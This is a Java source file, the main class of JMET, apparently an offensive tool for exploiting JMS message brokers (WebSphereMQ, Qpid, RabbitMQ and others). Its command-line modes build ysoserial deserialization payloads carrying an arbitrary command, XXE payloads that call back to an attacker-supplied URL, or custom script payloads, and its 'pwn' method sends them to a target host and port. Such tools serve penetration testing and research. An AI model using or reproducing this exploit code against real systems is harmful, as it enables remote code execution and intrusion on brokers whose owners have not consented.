package de.codewhite.jmet;

import com.google.common.base.Joiner;
import de.codewhite.jmet.exceptions.*;
import de.codewhite.jmet.filter.ScriptMesageFilter;
import de.codewhite.jmet.payload.impl.CustomPayloader;
import de.codewhite.jmet.payload.impl.ObjectPayloadItem;
import de.codewhite.jmet.payload.impl.PayloadGenerator;
import de.codewhite.jmet.payload.impl.TextPayloadItem;
import de.codewhite.jmet.target.JMSTarget;
import de.codewhite.jmet.types.DestType;
import de.codewhite.jmet.types.TargetType;
import de.codewhite.jmet.types.XXETypes;
import de.codewhite.jmet.types.YsoserialPayload;
import org.apache.commons.cli.*;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import javax.jms.Message;
import javax.script.ScriptException;
import java.io.FileNotFoundException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.file.DirectoryStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;


/**
 * Created by kaimatt
 */
public class JMET {

    private static final Logger logger = LogManager.getLogger(JMET.class);
    private JMSTarget target;
    private Options options;
    private CommandLine cmd;
    private List<Message> payloads = new ArrayList<>();
    private JMET jmet;


    public Options getOptions() {
        return options;
    }

    public static void main(String[] args) {

        JMET jmet = null;

        try {
            jmet = new JMET();
            jmet.setup(args);
            jmet.pwn();
        } catch (ParseException | ClassNotFoundException e) {
            logger.error("Misconfiguration: {}", e.getMessage());
            HelpFormatter formatter = new HelpFormatter();
            formatter.printHelp("jmet [host] [port]", jmet.getOptions());
        } catch (NoSuchMethodException e) {
            logger.error("Javascript method not found", e);
        } catch (ScriptException e) {
            logger.error("Error in executing Javascript script",e);
        } catch (FileNotFoundException e) {
            logger.error("Javascript file not found", e);
        } catch (IllegalAccessException e) {
            logger.error("Couldn't access method/constructor of target",e);
        } catch (InstantiationException e) {
            logger.error("Failed to create target",e);
        } catch (InvocationTargetException e) {
            logger.error("Failed to set property on target", e);
        }
    }

    private void pwn() {

        try {
            target.init();
            target.check();
            target.sendPayloads();
            target.shutdown();
        } catch (InitException ie) {
            logger.error("Init failed:", ie.getCause());
            logger.debug("", ie);

        } catch (SendException se) {
            logger.error("Send failed:", se.getCause());
            logger.debug("", se);

        } catch (CheckException ce) {
            logger.error("Check failed:", ce.getCause());
            logger.debug("", ce);

        } catch (ShutdownException se) {
            logger.error("Shutdown failed:", se.getCause());
            logger.debug("", se);

        } catch (NoSuchMethodException ne) {
            logger.error("Javascript method \"filter\" not found: {}", ne.getMessage());
            logger.debug("", ne);

        } catch (ScriptException jse) {
            logger.error("Execution of Javascript method \"filter\" failed: {}", jse.getMessage());
            logger.debug("", jse);
        }
    }


    private void setup(String[] args) throws ParseException, FileNotFoundException, ScriptException, NoSuchMethodException, ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException {

        parseCommandline(args);
        validateAndCreateTargets();
        validateAndCreatePayloads();
        setupExternalLibs();
    }

    private void validateAndCreatePayloads() throws ScriptException, FileNotFoundException, NoSuchMethodException, NoClassDefFoundError {

        if (cmd.hasOption("ysoserial")) {

            List<ObjectPayloadItem> objectPayloadItems = new ArrayList<>();
            List<YsoserialPayload> ysoGadgets = null;

            String exec = cmd.getOptionValue("ysoserial");
            String gadget = cmd.getOptionValue("payload");

            if (null == gadget) {
                ysoGadgets = Arrays.asList(YsoserialPayload.values());
            } else {
                ysoGadgets = new ArrayList();
                ysoGadgets.add(YsoserialPayload.valueOf(gadget));
            }
            target.addObjectPayloads(PayloadGenerator.createGadgetObjectPayloads(ysoGadgets, objectPayloadItems, exec, cmd.hasOption("substitute"), target.isGadgetWrapping()));

        } else if (cmd.hasOption("XXE")) {
            List<TextPayloadItem> textPayloadItems = new ArrayList<>();
            List<XXETypes> xxeVectors = null;

            String dnsName = cmd.getOptionValue("XXE");
            String xxeVectorName = cmd.getOptionValue("xxepayload");

            if (null == xxeVectorName) {
                xxeVectors = Arrays.asList(XXETypes.values());
            } else {
                xxeVectors = new ArrayList<>();
                xxeVectors.add(XXETypes.valueOf(xxeVectorName));
            }

            target.addTextPayloads(PayloadGenerator.createXXETextPayloads(xxeVectors, textPayloadItems, dnsName));

        } else if (cmd.hasOption("Custom")) {
            String customScriptName = cmd.getOptionValue("Custom");
            CustomPayloader loader = new CustomPayloader();
            loader.setupPayloadsOnTarget(customScriptName, target);

        }

    }

    private void setupExternalLibs() {

        try {
            URLClassLoader loader = (URLClassLoader) ClassLoader.getSystemClassLoader();
            Class cl = URLClassLoader.class;

            Method method = cl.getDeclaredMethod("addURL", URL.class);
            method.setAccessible(true);

            Path jarDir = Paths.get("external");
            DirectoryStream<Path> stream = Files.newDirectoryStream(jarDir, "*.{jar}");

            for (Path entry : stream) {
                URL jarToLoad = entry.toUri().toURL();
                method.invoke(loader, jarToLoad);
            }
        } catch (Exception e) {
            logger.error("Failed to setup external libraries!", e);
        }

    }


    private void validateAndCreateTargets() throws ParseException, FileNotFoundException, ScriptException, ClassNotFoundException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException {

        TargetType t = null;
        try {
            t = TargetType.valueOf(cmd.getOptionValue("impl"));
        } catch (IllegalArgumentException e) {
            throw new ParseException("Wrong target specified");
        }
        Class clazz = Class.forName("de.codewhite.jmet.target.impl." + t.name() + "Target");
        target = (JMSTarget) clazz.newInstance();
        switch (t) {
            case Qpid10:
                target.setGadgetWrapping(true);
                break;
            case WebSphereMQ:
                String channel = cmd.getOptionValue("channel");
                String queueManager = cmd.getOptionValue("queuemanager");
                if (channel == null || queueManager == null) {
                    throw new ParseException("Error: channel or queuemanager missing!");
                }
//                ((WebSphereMQTarget) target).setChannel(channel);
//                ((WebSphereMQTarget) target).setQueueManager(queueManager);
                // the lazy way
                invokeMethod(target, "setChannel", channel);
                invokeMethod(target, "setQueueManager", queueManager);
                break;
        }
        String dest = cmd.getOptionValue("Queue");
        if (dest != null) {
            target.setDestType(DestType.QUEUE);
        } else {
            dest = cmd.getOptionValue("Topic");
            target.setDestType(DestType.TOPIC);
        }
        target.setDestination(dest);
        target.setUser(cmd.getOptionValue("user"));
        target.setPassword(cmd.getOptionValue("password"));

        List<String> args = cmd.getArgList();
        if (args.size() != 2) {
            throw new ParseException("host or port");
        }
        target.setHost(args.get(0));
        target.setPort(Integer.valueOf(args.get(1)));

        String filter = cmd.getOptionValue("filter");
        if (filter != null) {
            target.setFilter(new ScriptMesageFilter(filter));
        }
        target.setVhost(cmd.getOptionValue("vhost"));

    }

    private void parseCommandline(String[] args) throws ParseException {

        CommandLineParser parser = new DefaultParser();
        options = new Options();

        Option verbose = Option.builder("v").argName("v").longOpt("verbose").hasArg(false).desc("Running verbose mode").build();
        Option substitute = Option.builder("s").argName("s").longOpt("substitute").hasArg(false).desc("Substituation mode: Use §§ to pass ysoserial payload name to CMD").build();

        Option impl = Option.builder("I").longOpt("impl").hasArg(true).desc(Joiner.on("| ").join(TargetType.values())).required().build();

        Option user = Option.builder("u").argName("id").longOpt("user").hasArg(true).desc("user for authentication").required(false).build();
        Option password = Option.builder("pw").argName("pass").longOpt("password").hasArg(true).desc("password for authentication").required(false).build();

        Option channel = Option.builder("Zc").argName("channel").longOpt("channel").hasArg(true).desc("channel name (only WebSphereMQ)").required(false).build();
        Option queueManager = Option.builder("Zq").argName("name").longOpt("queuemanager").hasArg(true).desc("queue manager name (only WebSphereMQ)").required(false).build();
        Option vhost = Option.builder("Zv").argName("name").longOpt("vhost").hasArg(true).desc("vhost name (only AMQP-Brokers: RabbitMQ|QPid09|QPid10)").required(false).build();
        Option filterScript = Option.builder("f").argName("scriptname").longOpt("filter").hasArg(true).desc("filter script").required(false).build();

        Option ysoerial = Option.builder("Y").argName("CMD").longOpt("ysoserial").hasArg(true).desc("Deser exploitation mode").required().build();
        Option ysoerialPayload = Option.builder("Yp").argName("payloadname").longOpt("payload").hasArg(true).desc("Optional: Ysoserial Payload to use " + Joiner.on("| ").join(YsoserialPayload.values())).required(false).build();
        Option xxe = Option.builder("X").argName("URL").longOpt("XXE").hasArg(true).desc("XXE exploitation mode").required().build();
        Option xxePayload = Option.builder("Xp").argName("payloadname").longOpt("xxepayload").hasArg(true).desc("Optional: XXE Payload to use " + Joiner.on("| ").join(XXETypes.values())).required(false).build();
        Option custom = Option.builder("C").argName("scriptname").longOpt("Custom").hasArg(true).desc("Custom script exploitation mode").required().build();
        OptionGroup attackMode = new OptionGroup();


        attackMode.addOption(ysoerial);
        attackMode.addOption(xxe);
        attackMode.addOption(custom);

        attackMode.setRequired(true);

        options.addOptionGroup(attackMode);

        Option queue = Option.builder("Q").argName("name").longOpt("Queue").hasArg(true).desc("queue name").required().build();
        Option topic = Option.builder("T").argName("name").longOpt("Topic").hasArg(true).desc("topic name").required().build();
        OptionGroup dest = new OptionGroup();

        dest.addOption(queue);
        dest.addOption(topic);
        dest.setRequired(true);

        options.addOptionGroup(dest);

        options.addOption(verbose);
        options.addOption(substitute);

        options.addOption(impl);
        options.addOption(user);
        options.addOption(password);
        options.addOption(ysoerialPayload);
        options.addOption(xxePayload);

        options.addOption(channel);
        options.addOption(queueManager);
        options.addOption(vhost);
        options.addOption(filterScript);

        this.cmd = parser.parse(options, args);

    }

    public static void invokeMethod(JMSTarget t, String name, String arg) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        t.getClass().getDeclaredMethod(name, String.class).invoke(t, arg);
    }

}
